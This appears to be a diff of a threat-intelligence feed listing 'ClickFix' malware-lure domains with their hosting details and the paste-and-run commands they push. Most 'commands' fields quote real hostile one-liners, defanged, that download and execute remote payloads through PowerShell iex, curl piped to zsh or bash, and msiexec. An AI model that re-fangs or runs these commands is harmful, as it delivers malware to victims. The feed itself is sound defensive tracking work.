@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5765,
+ "count": 5782,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -20959,58 +20959,6 @@
    "lure_from": []
   },
   {
-   "indicator": "amara-art.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-12",
-   "last_seen": "2026-11-15",
-   "last_online": "2026-11-24",
-   "offline_since": null,
-   "url": "https://amara-art.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Namecheap",
-   "dns": "reemsoft.com",
-   "ip": "203.161.38.107",
-   "asn": "AS22612",
-   "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "203.161.38.107",
-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "amara-art.com",
-     "status": "online",
-     "first_seen": "2026-11-12",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "lepafonso.bz",
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "amarcordangrese.com",
    "type": "domain",
    "category": "clickfix",
@@ -32641,7 +32589,7 @@
      "asn": "AS26347",
      "org": "DREAMHOST-AS - New Dream Network, LLC, US",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -32649,7 +32597,7 @@
      "host": "www.attars.ca",
      "status": "online",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -40729,6 +40677,56 @@
    ]
   },
   {
+   "indicator": "beemove.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-23",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://blog.beemove.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "162.241.63.87",
+   "asn": "AS31898",
+   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "162.241.63.87",
+     "asn": "AS31898",
+     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "blog.beemove.com.br",
+     "status": "online",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "beerbalco.com",
    "type": "domain",
    "category": "clickfix",
@@ -41033,6 +41031,56 @@
    "lure_from": [
     "browse-cloud.codes",
     "img-codes-cloude.info"
+   ]
+  },
+  {
+   "indicator": "belbay.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://belbay.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "50.116.113.44",
+   "asn": "AS31898",
+   "org": "Oracle Corporation",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "50.116.113.44",
+     "asn": "AS31898",
+     "org": "Oracle Corporation",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "belbay.com.br",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -53386,6 +53434,61 @@
    ]
   },
   {
+   "indicator": "brusfire-ead.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://www.brusfire-ead.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "108.179.253.79",
+   "asn": "AS31898",
+   "org": "Oracle Corporation",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "108.179.253.79",
+     "asn": "AS31898",
+     "org": "Oracle Corporation",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.brusfire-ead.com.br",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+   ],
+   "connects_to": [
+    "cosmical2049.com",
+    "copiose.org",
+    "escapeai.live"
+   ],
+   "lure_from": [
+    "hyyuuuuikooonyaa.org",
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "brusnika.kiev.ua",
    "type": "domain",
    "category": "clickfix",
@@ -55508,6 +55611,56 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "bvsc.top",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://www.bvsc.top/",
+   "brand": null,
+   "product": null,
+   "hosting": "Alibaba Cloud",
+   "dns": "Alibaba DNS",
+   "ip": "121.199.173.40",
+   "asn": "AS37963",
+   "org": "ALIBABA-CN-NET - Hangzhou Alibaba Advertising Co.,Ltd., CN",
+   "country": "CN",
+   "ips": [
+    {
+     "ip": "121.199.173.40",
+     "asn": "AS37963",
+     "org": "ALIBABA-CN-NET - Hangzhou Alibaba Advertising Co.,Ltd., CN",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.bvsc.top",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
   },
   {
    "indicator": "bwa.id",
@@ -59955,6 +60108,54 @@
    "lure_from": []
   },
   {
+   "indicator": "cartechchiptuning.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "http://cartechchiptuning.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "104.21.50.213",
+   "asn": "AS13335",
+   "org": "Cloudflare, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "104.21.50.213",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "cartechchiptuning.com",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc"
+   ],
+   "lure_from": []
+  },
+  {
    "indicator": "casabellaexteriors.com",
    "type": "domain",
    "category": "clickfix",
@@ -64322,6 +64523,56 @@
    ]
   },
   {
+   "indicator": "chandigarhhenggcollege.rf.gd",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://chandigarhhenggcollege.rf.gd/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS Wildcard UK Limited",
+   "dns": "infinityfree.com",
+   "ip": "185.27.134.126",
+   "asn": "AS34119",
+   "org": "WILDCARD-AS Wildcard UK Limited, GB",
+   "country": "GB",
+   "ips": [
+    {
+     "ip": "185.27.134.126",
+     "asn": "AS34119",
+     "org": "WILDCARD-AS Wildcard UK Limited, GB",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "chandigarhhenggcollege.rf.gd",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//cosmical2049[.]com/startapv2/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+   ],
+   "connects_to": [
+    "cosmical2049.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "changingthesalesgame.com",
    "type": "domain",
    "category": "clickfix",
@@ -66041,6 +66292,65 @@
    "lure_from": []
   },
   {
+   "indicator": "choi-co-caro-di.netlify.app",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-23",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://choi-co-caro-di.netlify.app/",
+   "brand": null,
+   "product": null,
+   "hosting": "Netlify",
+   "dns": null,
+   "ip": "35.157.26.135",
+   "asn": "AS16509",
+   "org": "AMAZON-02 - Amazon.com, Inc., US",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2a05:d014:58f:6200::258",
+     "asn": "AS16509",
+     "org": "AMAZON-02 - Amazon.com, Inc., US",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    },
+    {
+     "ip": "35.157.26.135",
+     "asn": "AS16509",
+     "org": "AMAZON-02 - Amazon.com, Inc., US",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "choi-co-caro-di.netlify.app",
+     "status": "online",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/ki9ao4wpdn/[id]')|iex",
+    "curl -kfsSL $(echo '[encoded]'|base64 -D)|zsh;"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net",
+    "modalgrid.com"
+   ],
+   "lure_from": [
+    "interseq.at"
+   ]
+  },
+  {
    "indicator": "choiceroofingcompany.com",
    "type": "domain",
    "category": "clickfix",
@@ -66617,6 +66927,57 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "cibelecs.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "http://cibelecs.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "EVEO S.A.",
+   "dns": "brasil106-5030.com.br",
+   "ip": "45.148.96.7",
+   "asn": "AS53107",
+   "org": "EVEO S.A.",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "45.148.96.7",
+     "asn": "AS53107",
+     "org": "EVEO S.A.",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "cibelecs.com.br",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+   ],
+   "connects_to": [
+    "j7tracker.gb.net"
+   ],
+   "lure_from": [
+    "interseq.at",
+    "img-codes-cloude.info"
+   ]
   },
   {
    "indicator": "cichepodlasie.pl",
@@ -68833,7 +69194,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -78624,6 +78985,56 @@
    "lure_from": []
   },
   {
+   "indicator": "culturalandsingaporedress.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-23",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://culturalandsingaporedress.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Tier 4 Cloud Services",
+   "dns": "iseencloud.com",
+   "ip": "45.113.226.226",
+   "asn": "AS146943",
+   "org": "TIER4CLOU-AS - Tier 4 Cloud Services, IN",
+   "country": "IN",
+   "ips": [
+    {
+     "ip": "45.113.226.226",
+     "asn": "AS146943",
+     "org": "TIER4CLOU-AS - Tier 4 Cloud Services, IN",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "culturalandsingaporedress.com",
+     "status": "online",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+   ],
+   "connects_to": [
+    "lepafonso.bz"
+   ],
+   "lure_from": [
+    "makeverizyjar.info"
+   ]
+  },
+  {
    "indicator": "cultursol.com",
    "type": "domain",
    "category": "clickfix",
@@ -86572,7 +86983,7 @@
      "asn": "AS14555",
      "org": "LIQUIDNETLTD1 - LiquidNet US LLC, US",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -86580,7 +86991,7 @@
      "host": "diamondsolarusa.com",
      "status": "online",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -87939,7 +88350,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -87947,7 +88358,7 @@
      "host": "dijitalpencere.com.tr",
      "status": "online",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -90105,10 +90516,13 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//lmabagas[.]com/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
+    "lmabagas.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -96069,7 +96483,7 @@
      "asn": "AS203053",
      "org": "ClausWEB CLAUS WEB srl, RO",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -96077,7 +96491,7 @@
      "host": "stagiimedicale.econyouth.ro",
      "status": "online",
      "first_seen": "2026-11-20",
-     "last_seen": "2026-11-23"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -111029,10 +111443,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//lmabagas[.]com/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x');",
     "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
+    "lmabagas.com",
     "github.pw"
    ],
    "lure_from": [
@@ -142077,6 +142493,56 @@
    "lure_from": []
   },
   {
+   "indicator": "iamshahid.pro",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-10-25",
+   "last_seen": "2026-10-25",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://iamshahid.pro/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "188.114.96.3",
+   "asn": "AS13335",
+   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+   "country": null,
+   "ips": [
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-10-25",
+     "last_seen": "2026-10-25"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "iamshahid.pro",
+     "status": "online",
+     "first_seen": "2026-10-25",
+     "last_seen": "2026-10-25"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell -WindowStyle Hidden -Command \"$d=[xml](New-Object Net.WebClient).DownloadString('hxxps[:]//ke4asholdings[.]com/4/config.xml');Invoke-Expression $d.config.command.InnerText\";"
+   ],
+   "connects_to": [
+    "ke4asholdings.com"
+   ],
+   "lure_from": [
+    "cloudflare-eth.com"
+   ]
+  },
+  {
    "indicator": "ibage.com.br",
    "type": "domain",
    "category": "clickfix",
@@ -157614,10 +158080,12 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "lepafonso.bz",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -160195,13 +160663,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\" echo \" ________ ________ / ____/ /___ __ ______/ / __/ /___ _________ / / / / __ \\/ / / / __ / /_/ / __ / ___/ _ \\ / /___/ / /_/ / /_/ / /_/ / __/ / /_/ / / / __/ \\____/_/\\____/\\__,_/\\__,_/_/ /_/\\__,_/_/ \\___/ \"` Write-Output \"Initializing verification ...\" Start-Sleep -Milliseconds 688 $updateloadUrl = '[encoded]' $bytes = [Convert]::FromBase64String($updateloadUrl) $clean = [Text.Encoding]::Unicode.GetString($bytes) Start-Sleep -Milliseconds 576 Write-Output \"Processing request ...\" Start-Sleep -Milliseconds 896 Write-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \" for ($i = 0; $i -lt 5; $i++) { Start-Sleep -Milliseconds 400 Write-Host -NoNewline \".\" } Invoke-Expression $clean",
     "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -163497,6 +163967,54 @@
     "interseq.at",
     "codes.caffe-img.com"
    ]
+  },
+  {
+   "indicator": "kiev365.com.ua",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://kiev365.com.ua/",
+   "brand": null,
+   "product": null,
+   "hosting": "DigitalOcean",
+   "dns": "ns.ua",
+   "ip": "139.59.147.208",
+   "asn": "AS14061",
+   "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "139.59.147.208",
+     "asn": "AS14061",
+     "org": "DIGITALOCEAN-ASN - DigitalOcean, LLC, US",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "kiev365.com.ua",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '44aw8dm8[.]toppillole[.]com/?ublib=')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+   ],
+   "connects_to": [
+    "44aw8dm8.toppillole.com"
+   ],
+   "lure_from": []
   },
   {
    "indicator": "kievbur.com.ua",
@@ -169105,6 +169623,56 @@
     "4y22le9q.evine.store"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "laertejroficial.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://laertejroficial.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "108.179.253.192",
+   "asn": "AS31898",
+   "org": "Oracle Corporation",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "108.179.253.192",
+     "asn": "AS31898",
+     "org": "Oracle Corporation",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "laertejroficial.com.br",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"hxxps[:]//unchekk[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
+   ],
+   "connects_to": [
+    "unchekk.com"
+   ],
+   "lure_from": [
+    "img-codes-cloude.info"
+   ]
   },
   {
    "indicator": "lafx.asia",
@@ -201813,6 +202381,56 @@
    ]
   },
   {
+   "indicator": "newmember01.unaux.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "https://newmember01.unaux.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS Wildcard UK Limited",
+   "dns": "byet.org",
+   "ip": "185.27.134.216",
+   "asn": "AS34119",
+   "org": "WILDCARD-AS Wildcard UK Limited, GB",
+   "country": "GB",
+   "ips": [
+    {
+     "ip": "185.27.134.216",
+     "asn": "AS34119",
+     "org": "WILDCARD-AS Wildcard UK Limited, GB",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "newmember01.unaux.com",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "msiexec /q /i hxxps[:]//distnode[.]biz/deploy-named-queue/macro"
+   ],
+   "connects_to": [
+    "distnode.biz"
+   ],
+   "lure_from": [
+    "img-codes-cloude.info"
+   ]
+  },
+  {
    "indicator": "newpremierproducts.com",
    "type": "domain",
    "category": "clickfix",
@@ -209445,6 +210063,63 @@
     "tlschssl22read.cc",
     "webrtwtre22.cc",
     "webffoo002.cc"
+   ]
+  },
+  {
+   "indicator": "orientalicitacoes.com.br",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
+   "offline_since": null,
+   "url": "http://orientalicitacoes.com.br/",
+   "brand": null,
+   "product": null,
+   "hosting": "Oracle Cloud",
+   "dns": "Newfold",
+   "ip": "162.241.203.146",
+   "asn": "AS31898",
+   "org": "Oracle Corporation",
+   "country": "BR",
+   "ips": [
+    {
+     "ip": "162.241.203.146",
+     "asn": "AS31898",
+     "org": "Oracle Corporation",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "orientalicitacoes.com.br",
+     "status": "online",
+     "first_seen": "2026-11-24",
+     "last_seen": "2026-11-24"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxps[:]//cosmical2049[.]com/lom3/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "iex(irm 'hxxps[:]//copiose[.]org/lom/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
+    "curl -s $(echo \"[encoded]\" | base64 -d) | zsh"
+   ],
+   "connects_to": [
+    "cosmical2049.com",
+    "copiose.org",
+    "escapeai.live",
+    "gfisoda.biz"
+   ],
+   "lure_from": [
+    "interseq.at",
+    "hyyuuuuikooonyaa.org",
+    "mon-blanc-02.cfd"
    ]
   },
   {
@@ -224589,7 +225264,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-16",
-   "last_seen": "2026-11-18",
+   "last_seen": "2026-11-24",
    "last_online": "2026-11-24",
    "offline_since": null,
    "url": "https://ptthaiimport.ch/",
@@ -224607,7 +225282,7 @@
      "asn": "AS24940",
      "org": "HETZNER-AS Hetzner Online GmbH, DE",
      "first_seen": "2026-11-16",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -224615,7 +225290,7 @@
      "host": "ptthaiimport.ch",
      "status": "online",
      "first_seen": "2026-11-16",
-     "last_seen": "2026-11-18"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
@@ -244334,6 +245009,65 @@
     "mkeptlw3.devam.store"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "save-money-explore-future.netlify.app",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-11-24",
+   "last_seen": "2026-11-24",
+   "last_online": "2026-11-24",
